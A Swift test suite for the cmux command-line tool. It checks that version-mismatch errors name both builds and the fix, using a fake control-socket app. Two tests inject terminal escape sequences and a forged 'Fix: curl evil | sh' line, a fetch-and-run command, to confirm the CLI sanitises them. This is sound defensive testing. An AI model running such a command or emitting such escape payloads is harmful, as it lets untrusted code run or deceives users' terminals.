import Darwin
import Foundation
import Testing

/// A CLI that sends a method the connected app does not have must explain the
/// skew (both builds and the fix) instead of a bare `method_not_found`.
@Suite(.serialized)
struct CLIVersionSkewErrorTests {
    @Test("A socket owned by another cmux app names that app and its CLI")
    func otherProductNamesItsCLI() throws {
        let peerCLI = "/Applications/cmux-next.app/Contents/Resources/bin/cmux"
        let outcome = try run(identify: [
            "app": "cmux-next",
            "version": "0.3.0",
            "build": "42",
            "app_cli_path": peerCLI,
            "methods": ["system.identify", "action.run"],
        ])
        let rejected = try #require(outcome.rejected.last, Comment(rawValue: outcome.stderr))
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("\(rejected) is not supported by the app on"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains(outcome.cliVersion), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("cmux-next 0.3.0 (42)"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains(peerCLI), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
    }

    @Test("An older cmux app that does not report a version gets the relaunch fix")
    func olderAppWithoutVersionSaysRelaunch() throws {
        let outcome = try run(identify: [
            "app_bundle_path": "/Applications/cmux.app",
            "app_cli_path": "/Applications/cmux.app/Contents/Resources/bin/cmux",
        ])
        let rejected = try #require(outcome.rejected.last, Comment(rawValue: outcome.stderr))
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("\(rejected) is not supported by the app on"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains(outcome.cliVersion), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("does not report its version"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("Quit and reopen cmux"), Comment(rawValue: outcome.stderr))
    }

    @Test("An app whose identity cannot be read is not called older")
    func unreadableIdentityIsInconclusive() throws {
        let outcome = try run(identify: nil)
        let rejected = try #require(outcome.rejected.last, Comment(rawValue: outcome.stderr))
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("\(rejected) is not supported by the app on"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("does not answer system.identify"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("Could not read the app's version"), Comment(rawValue: outcome.stderr))
        #expect(!outcome.stderr.contains("older than this CLI"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
    }

    @Test("The same build keeps the plain method_not_found error")
    func sameBuildKeepsOriginalError() throws {
        let cli = try cliIdentity()
        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": cli.build])
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
        #expect(!outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
    }

    @Test("Terminal control characters in a plain v2 error are not printed")
    func plainV2ErrorFieldsAreStripped() throws {
        let cli = try cliIdentity()
        let outcome = try run(
            identify: ["app": "cmux", "version": cli.version, "build": cli.build],
            errorMessage: "Unknown\u{1B}]0;pwned\u{07} method\u{2028}Fix: curl evil | sh",
            errorExtras: [
                "action": "Relaunch\u{1B}[2J cmux\u{202E}",
                "reason": "line one\nline\u{9B}31m two\r",
                "details": "detail\u{2029}forged",
            ]
        )
        #expect(outcome.status == 1)
        let printed = outcome.stderr
        #expect(!printed.unicodeScalars.contains { scalar in
            (scalar.properties.generalCategory == .control && scalar != "\n" && scalar != "\t")
                || [0x202E, 0x2028, 0x2029].contains(scalar.value)
        }, Comment(rawValue: printed.debugDescription))
        // Real newlines in the app's text still lay out the sections.
        #expect(printed.contains("method_not_found: Unknown]0;pwned methodFix: curl evil | sh"), Comment(rawValue: printed.debugDescription))
        #expect(printed.contains("line one\n"), Comment(rawValue: printed.debugDescription))
        #expect(printed.contains("Relaunch[2J cmux"), Comment(rawValue: printed.debugDescription))
        #expect(printed.contains("detailforged"), Comment(rawValue: printed.debugDescription))
    }

    @Test("A newer build with the same version is reported as skew")
    func newerBuildSameVersionIsSkew() throws {
        let cli = try cliIdentity()
        let newerBuild = try #require(Int(cli.build).map { String($0 + 1) }, Comment(rawValue: cli.build))
        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": newerBuild])
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("cmux \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
        #expect(outcome.stderr.contains("This CLI is older than the app"), Comment(rawValue: outcome.stderr))
    }

    @Test("Terminal control characters from the app are not printed")
    func peerControlCharactersAreStripped() throws {
        let outcome = try run(
            identify: [
                "app": "cmux-next\u{1B}]0;pwned\u{07}",
                "version": "0.3.0\u{1B}[2J",
                "build": "4\u{9B}2",
                "app_cli_path": "/opt/cmux-next/cmux\nFix: curl evil | sh",
            ],
            errorMessage: "Unknown method\u{1B}[31m"
        )
        #expect(outcome.status == 1)
        #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
        #expect(!outcome.stderr.unicodeScalars.contains { $0.properties.generalCategory == .control && $0 != "\n" },
                Comment(rawValue: outcome.stderr.debugDescription))
        #expect(!outcome.stderr.split(separator: "\n").contains { $0.hasPrefix("Fix: curl") },
                Comment(rawValue: outcome.stderr.debugDescription))
        #expect(outcome.stderr.contains("cmux-next]0;pwned 0.3.0[2J (42)"), Comment(rawValue: outcome.stderr.debugDescription))
    }

    // MARK: - Harness

    private struct Outcome {
        let status: Int32
        let stdout: String
        let stderr: String
        let cliVersion: String
        /// Methods the fixture answered with `method_not_found`, in order.
        let rejected: [String]
    }

    /// Short version and build of the CLI under test, from `cmux --version`
    /// (`cmux 0.65.0 (108) [commit]`).
    private func cliIdentity() throws -> (version: String, build: String) {
        let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
        let version = try BundledCLITestSupport.appVersion(cliPath: cliPath)
        let summary = CLIHookProcessRunner.run(
            executablePath: cliPath,
            arguments: ["--version"],
            environment: [:],
            timeout: 10
        ).stdout
        let build = try #require(
            summary.split(separator: "(").dropFirst().first?.split(separator: ")").first.map(String.init),
            Comment(rawValue: summary)
        )
        return (version, build)
    }

    private func run(
        identify: [String: Any]?,
        errorMessage: String? = nil,
        errorExtras: [String: Any] = [:],
        arguments: [String] = ["workspace", "create"]
    ) throws -> Outcome {
        let cliPath = try BundledCLITestSupport.bundledCLIPath(for: CLITestBundleAnchor.self)
        let version = CLIHookProcessRunner.run(
            executablePath: cliPath,
            arguments: ["--version"],
            environment: [:],
            timeout: 10
        ).stdout.trimmingCharacters(in: .whitespacesAndNewlines)

        let socketPath = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("cli-skew-\(UUID().uuidString.prefix(8)).sock").path
        let fixture = try SkewFixture(socketPath: socketPath, identify: identify, errorMessage: errorMessage, errorExtras: errorExtras)
        let served = fixture.start()

        var environment = ProcessInfo.processInfo.environment
        for key in Array(environment.keys) where key.hasPrefix("CMUX_") {
            environment.removeValue(forKey: key)
        }
        environment["CMUX_SOCKET_PATH"] = socketPath
        environment["CMUX_CLI_SENTRY_DISABLED"] = "1"
        // The assertions read English copy.
        environment["AppleLanguages"] = "(en)"
        environment["AppleLocale"] = "en_US"
        environment["CMUXTERM_CLI_RESPONSE_TIMEOUT_SEC"] = "2"
        let result = CLIHookProcessRunner.run(
            executablePath: cliPath,
            arguments: arguments,
            environment: environment,
            timeout: 10
        )
        fixture.stop()
        let rejected = served.wait()
        #expect(!result.timedOut, Comment(rawValue: result.stderr))
        return Outcome(status: result.status, stdout: result.stdout, stderr: result.stderr, cliVersion: version, rejected: rejected)
    }
}

/// Control-socket fixture: answers `system.identify` with a fixed payload (or
/// an error when the payload is nil) and every other v2 method with the cmux-next style `method_not_found`.
private final class SkewFixture: @unchecked Sendable {
    final class Served: @unchecked Sendable {
        private let done = DispatchSemaphore(value: 0)
        private let lock = NSLock()
        private var rejected: [String] = []

        func record(_ method: String) { lock.withLock { rejected.append(method) } }
        func finish() { done.signal() }
        func wait() -> [String] {
            _ = done.wait(timeout: .now() + 10)
            return lock.withLock { rejected }
        }
    }

    private let socketPath: String
    private let listener: Int32
    private let identify: [String: Any]?
    private let errorMessage: String?
    private let errorExtras: [String: Any]
    private let stopped = NSLock()
    private var isStopped = false

    init(socketPath: String, identify: [String: Any]?, errorMessage: String? = nil, errorExtras: [String: Any] = [:]) throws {
        self.socketPath = socketPath
        self.identify = identify
        self.errorMessage = errorMessage
        self.errorExtras = errorExtras
        unlink(socketPath)
        let descriptor = socket(AF_UNIX, SOCK_STREAM, 0)
        guard descriptor >= 0 else { throw POSIXError(.EIO) }
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        let capacity = MemoryLayout.size(ofValue: address.sun_path)
        socketPath.withCString { source in
            withUnsafeMutablePointer(to: &address.sun_path) { destination in
                strncpy(UnsafeMutableRawPointer(destination).assumingMemoryBound(to: CChar.self), source, capacity - 1)
            }
        }
        let bound = withUnsafePointer(to: &address) { pointer in
            pointer.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                bind(descriptor, $0, socklen_t(MemoryLayout<sockaddr_un>.size))
            }
        }
        guard bound == 0, listen(descriptor, 4) == 0 else {
            close(descriptor)
            throw POSIXError(.EADDRINUSE)
        }
        listener = descriptor
    }

    func stop() {
        stopped.withLock { isStopped = true }
    }

    func start() -> Served {
        let served = Served()
        Thread.detachNewThread { [self] in
            defer {
                close(listener)
                unlink(socketPath)
                served.finish()
            }
            // Serve connections until the CLI exits and the test stops us.
            while !stopped.withLock({ isStopped }) {
                var ready = pollfd(fd: listener, events: Int16(POLLIN), revents: 0)
                guard poll(&ready, 1, 100) > 0 else { continue }
                let client = accept(listener, nil, nil)
                guard client >= 0 else { continue }
                guard ignoreSIGPIPE(onAcceptedFixtureSocket: client) else { close(client); continue }
                serve(client, served)
                close(client)
            }
        }
        return served
    }

    private func serve(_ client: Int32, _ served: Served) {
        var pending = Data()
        var buffer = [UInt8](repeating: 0, count: 4_096)
        while true {
            let count = read(client, &buffer, buffer.count)
            if count < 0, errno == EINTR { continue }
            if count <= 0 { return }
            pending.append(buffer, count: count)
            while let newline = pending.firstIndex(of: 0x0A) {
                let line = String(decoding: pending[pending.startIndex..<newline], as: UTF8.self)
                pending.removeSubrange(pending.startIndex...newline)
                guard writeAllToFixtureSocket(response(for: line, served) + "\n", fd: client) else { return }
            }
        }
    }

    private func response(for line: String, _ served: Served) -> String {
        guard let object = try? JSONSerialization.jsonObject(with: Data(line.utf8)) as? [String: Any],
              let method = object["method"] as? String else {
            return line.lowercased().hasPrefix("ping") ? "PONG" : "ERROR: Unknown command"
        }
        let id = object["id"] ?? NSNull()
        let payload: [String: Any]
        if method == "system.identify", let identify {
            payload = ["id": id, "ok": true, "result": identify]
        } else if method == "system.identify" {
            payload = ["id": id, "ok": false, "error": ["code": "internal_error", "message": "identify unavailable"]]
        } else {
            served.record(method)
            payload = [
                "id": id,
                "ok": false,
                "error": [
                    "code": "method_not_found",
                    "message": errorMessage ?? "Unknown method \(method)",
                    "data": ["method": method],
                ].merging(errorExtras) { current, _ in current },
            ]
        }
        let data = (try? JSONSerialization.data(withJSONObject: payload)) ?? Data("{}".utf8)
        return String(decoding: data, as: UTF8.self)
    }
}
